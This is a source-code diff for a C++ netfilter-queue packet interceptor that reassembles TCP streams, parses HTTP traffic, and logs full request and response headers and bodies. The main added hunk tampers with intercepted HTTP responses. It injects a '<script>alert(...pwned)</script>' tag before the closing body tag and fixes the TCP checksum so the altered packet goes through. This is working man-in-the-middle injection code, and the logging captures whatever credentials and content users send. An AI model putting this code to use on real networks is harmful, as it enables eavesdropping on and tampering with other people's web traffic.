@@ -371,7 +371,7 @@ std::pair<u_char *, bool> process_packet(sniff_tcp *tcp, sniff_ip *ip,
 }
 }  // namespace TCPStreamer
 
-namespace HTTPDefragmenter {
+namespace HTTPParser {
 
 enum class ParserState {
   // nothing is known
@@ -471,7 +471,13 @@ std::map<__uint128_t, MessageReassemblyStatus> message_status_map;
  */
 std::map<__uint128_t, std::vector<HTTPReqRes>> pipelined_requests;
 
-FILE *log = fopen("log.txt", "w+");
+FILE *open_log() {
+  FILE *log = fopen("data/reqres/log.txt", "a+");
+  fprintf(log, "\n\n");
+  return log;
+}
+
+FILE *log = open_log();
 
 __uint128_t build_map_key(sniff_tcp *tcp, sniff_ip *ip) {
   __uint128_t key = 0;
@@ -570,7 +576,7 @@ HTTPReqRes *finish_response_message(sniff_ip *ip, sniff_tcp *tcp) {
  * Does nothing more than enqueue the request in the pipelining history
  */
 void finish_request_message(sniff_ip *ip, sniff_tcp *tcp) {
-  printf("finish_response_message\n");
+  printf("finish_request_message\n");
   __uint128_t map_key = build_map_key(tcp, ip);
 
   auto &&status = message_status_map[map_key];
@@ -659,18 +665,20 @@ HTTPReqRes *process_bytes_since_body_start(sniff_ip *ip, sniff_tcp *tcp) {
   if (status.headers.count("Content-Length") != 0) {
     content_length = atoi(status.headers["Content-Length"].data());
   }
+  if (status.headers.count("content-length") != 0) {
+    content_length = atoi(status.headers["content-length"].data());
+  }
   // TODO: As of now, we only support Content-Length header for body size
   // calculation
   // case 1: unsupported size-specifying header
   if (content_length == -1 && status.headers.count("Transfer-Encoding") != 0) {
-    printf(
-        "Received Transfer-Encoding header, but we only support "
-        "Content-Length\n");
+    printf("We only support Content-Length\n");
     exit(1);
   }
 
   // case 2: There is no body and this is a request
   else if (content_length == -1 && status.is_request) {
+    printf("case 2\n");
     finish_request_message(ip, tcp);
 
     // prepare state for future requests
@@ -681,6 +689,7 @@ HTTPReqRes *process_bytes_since_body_start(sniff_ip *ip, sniff_tcp *tcp) {
 
   // case 3: There is no body and this is a response
   else if (content_length == -1 && !status.is_request) {
+    printf("case 3\n");
     HTTPReqRes *reqres = finish_response_message(ip, tcp);
 
     // prepare state for future responses
@@ -692,6 +701,7 @@ HTTPReqRes *process_bytes_since_body_start(sniff_ip *ip, sniff_tcp *tcp) {
 
   // case 4: There IS body (either in a request or in a response)
   else if (content_length != -1) {
+    printf("case 4\n");
     int consumable_length =
         min(status.raw_data_length - next_index, content_length);
 
@@ -793,13 +803,16 @@ HTTPReqRes *process_bytes_since_header_line(sniff_ip *ip, sniff_tcp *tcp) {
     }
 
     status.headers[header_name] = header_value;
+    printf("Got header '%s', value '%s'\n", header_name.data(),
+           header_value.data());
 
     // skip \r\n
 
     next_index++;
     if (status.raw_data[next_index] != '\n') {
-      printf("Expected line terminator, but got '%c'",
+      printf("Expected line terminator, but got '%c'\n",
              status.raw_data[next_index]);
+      printf("Data Context:\n(%.*s)\n\n", next_index, status.raw_data);
       exit(1);
     }
     next_index++;
@@ -1031,7 +1044,7 @@ HTTPReqRes *process_bytes(sniff_ip *ip, sniff_tcp *tcp, u_char *data,
   }
 }
 
-}  // namespace HTTPDefragmenter
+}  // namespace HTTPParser
 
 /**
  * `verdict` should be manipulated by the function to signal packet
@@ -1127,40 +1140,39 @@ static void print_pkt(struct nfq_data *tb, packet_verdict_t *verdict) {
         printf("Reassembled TCP payload:\n(%.*s)\n\n", payload_length,
                tcp_dedup.first);
 
-        HTTPDefragmenter::HTTPReqRes *http_msg =
-            HTTPDefragmenter::process_bytes(ip, tcp, tcp_dedup.first,
-                                            payload_length);
+        HTTPParser::HTTPReqRes *http_msg =
+            HTTPParser::process_bytes(ip, tcp, tcp_dedup.first, payload_length);
 
         if (http_msg) {
           printf("Reassembled HTTP req-res cycle.\n");
-          fprintf(HTTPDefragmenter::log, "HTTP %s Request to %s\n",
+          fprintf(HTTPParser::log, "HTTP %s Request to %s\n",
                   http_msg->request_method.data(),
                   http_msg->request_url.data());
-          fprintf(HTTPDefragmenter::log, "Request headers:\n");
+          fprintf(HTTPParser::log, "Request headers:\n");
 
           for (auto &&header : http_msg->request_headers) {
-            fprintf(HTTPDefragmenter::log, "%s: %s\n", header.first.data(),
+            fprintf(HTTPParser::log, "%s: %s\n", header.first.data(),
                     header.second.data());
           }
 
-          fprintf(HTTPDefragmenter::log, "\n");
+          fprintf(HTTPParser::log, "\n");
 
-          fprintf(HTTPDefragmenter::log, "Request body:\n");
+          fprintf(HTTPParser::log, "Request body:\n");
 
-          fprintf(HTTPDefragmenter::log, "%.*s\n\n",
-                  http_msg->request_body_length, http_msg->request_body);
+          fprintf(HTTPParser::log, "%.*s\n\n", http_msg->request_body_length,
+                  http_msg->request_body);
 
-          fprintf(HTTPDefragmenter::log, "HTTP Response\n");
-          fprintf(HTTPDefragmenter::log, "Response status: %d\n",
+          fprintf(HTTPParser::log, "HTTP Response\n");
+          fprintf(HTTPParser::log, "Response status: %d\n",
                   http_msg->response_status);
-          fprintf(HTTPDefragmenter::log, "Response headers:\n");
+          fprintf(HTTPParser::log, "Response headers:\n");
 
           for (auto &&header : http_msg->response_headers) {
-            fprintf(HTTPDefragmenter::log, "%s: %s\n", header.first.data(),
+            fprintf(HTTPParser::log, "%s: %s\n", header.first.data(),
                     header.second.data());
           }
 
-          fprintf(HTTPDefragmenter::log, "\n");
+          fprintf(HTTPParser::log, "\n");
 
           bool is_png =
               http_msg->response_headers["Content-Type"] == "image/png";
@@ -1168,7 +1180,7 @@ static void print_pkt(struct nfq_data *tb, packet_verdict_t *verdict) {
               http_msg->response_headers["Content-Type"] == "image/jpeg";
           bool is_image = is_png || is_jpeg;
           if (is_image) {
-            auto filename = "data/" +
+            auto filename = "data/images/" + http_msg->request_url + "/" +
                             std::to_string(std::chrono::system_clock::now()
                                                .time_since_epoch()
                                                .count()) +
@@ -1181,12 +1193,114 @@ static void print_pkt(struct nfq_data *tb, packet_verdict_t *verdict) {
             fclose(file);
           }
 
-          fprintf(HTTPDefragmenter::log, "Response body:\n");
+          fprintf(HTTPParser::log, "Response body:\n");
 
-          fprintf(HTTPDefragmenter::log, "%.*s\n\n",
-                  http_msg->response_body_length, http_msg->response_body);
+          fprintf(HTTPParser::log, "%.*s\n\n", http_msg->response_body_length,
+                  http_msg->response_body);
 
-          fflush(HTTPDefragmenter::log);
+          fflush(HTTPParser::log);
+
+          // tamper HTTP response
+          if ((http_msg->response_headers["Content-Type"] == "text/html" ||
+               true) &&
+              http_msg->response_headers.count("Content-Encoding") == 0) {
+            // recover original packet data for tampering
+            struct sniff_tcp *tcp = (sniff_tcp *)(data + ip_header_length);
+            int tcp_header_length = TH_OFF(tcp) * 4;
+            int payload_length = ret - ip_header_length - tcp_header_length;
+            // printf("tcp_header_length=%d ", tcp_header_length);
+            // printf("tcp_seq_num=%u ", ntohl(tcp->th_seq));
+            // printf("tcp_s_port=%u ", ntohs(tcp->th_sport));
+            // printf("tcp_d_port=%u ", ntohs(tcp->th_dport));
+            u_char *payload = data + ip_header_length + tcp_header_length;
+            // printf("Payload data:\n(%.*s)\n\n", payload_length, payload);
+
+            u_char *script =
+                (u_char
+                     *)"</script>/><script>alert(\"You have been pwned\")</script>";
+            int script_length = 56;  // not counting terminator
+
+            // search for </body> in the payload. We will insert the script
+            // right before it
+            int body_end_index = -1;
+            for (size_t i = 0;
+                 i <
+                 payload_length - (sizeof("</body>") - 1 /*discount \0*/) + 1;
+                 i++) {
+              if (prefix_match(payload + i, "</body>")) {
+                body_end_index = i;
+                break;
+              }
+            }
+
+            // payload copy to facilitate tcp checksum recalculation
+            u_char *payload_copy = new u_char[payload_length];
+            memcpy(payload_copy, payload, payload_length);
+
+            printf("Characteristic Payload data:\n(%.*s)\n\n", payload_length,
+                   payload);
+
+            // if we found the end of body and there is space for the script tag
+            if (body_end_index != -1 && body_end_index >= script_length) {
+              for (size_t i = 0; i < script_length; i++) {
+                payload[body_end_index - 1 - i] = script[script_length - i - 1];
+              }
+
+              printf("Found sufficient payload for tampering\n");
+
+              // recalculate TCP checksum
+              u_short check = ~tcp->th_sum;
+              u_short *payload_halfwords = (u_short *)payload;
+              u_short *payload_copy_halfwords = (u_short *)payload_copy;
+              for (size_t i = 0; i < (payload_length >> 1); i++) {
+                if (payload_halfwords[i] != payload_copy_halfwords[i]) {
+                  // check = ~(~check + ~payload_copy_halfwords[i] +
+                  //           payload_halfwords[i]);
+                  if (check < payload_copy_halfwords[i]) {
+                    check--;
+                    check -= payload_copy_halfwords[i];
+                  } else {
+                    check -= payload_copy_halfwords[i];
+                  }
+
+                  auto oldcheck = check;
+                  check += payload_halfwords[i];
+                  if (check < oldcheck) {
+                    check++;
+                  }
+                }
+              }
+              if (payload_length % 2 != 0) {
+                u_short old_padded_short =
+                    (((u_short)payload_copy[payload_length - 1]) << 8);
+                u_short padded_short =
+                    (((u_short)payload[payload_length - 1]) << 8);
+
+                if (check < old_padded_short) {
+                  check--;
+                  check -= old_padded_short;
+                } else {
+                  check -= old_padded_short;
+                }
+
+                auto oldcheck = check;
+                check += padded_short;
+                if (check < oldcheck) {
+                  check++;
+                }
+              }
+              tcp->th_sum = ~check;
+
+              printf(
+                  "Characteristic Payload data after modification:\n(%.*s)\n\n",
+                  payload_length, payload);
+
+              verdict->new_data = data;
+              verdict->new_data_length = ret;
+            }
+
+            delete[] payload_copy;
+          }
 
           delete[] http_msg->request_body;
           delete[] http_msg->response_body;
@@ -1200,6 +1314,10 @@ static void print_pkt(struct nfq_data *tb, packet_verdict_t *verdict) {
     }
   }
   fputc('\n', stdout);
+  if (verdict->new_data_length != 0 && verdict->new_data == nullptr) {
+    printf("WRONG !\n");
+    exit(1);
+  }
 }
 
 static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
@@ -1257,9 +1375,6 @@ int main(int argc, char **argv) {
   }
 
   fd = nfq_fd(h);
-
-  // para el tema del loss:   while ((rv = recv(fd, buf, sizeof(buf), 0)) && rv
-  // >= 0)
 
   while ((rv = recv(fd, buf, sizeof(buf), 0))) {
     printf("pkt received\n");
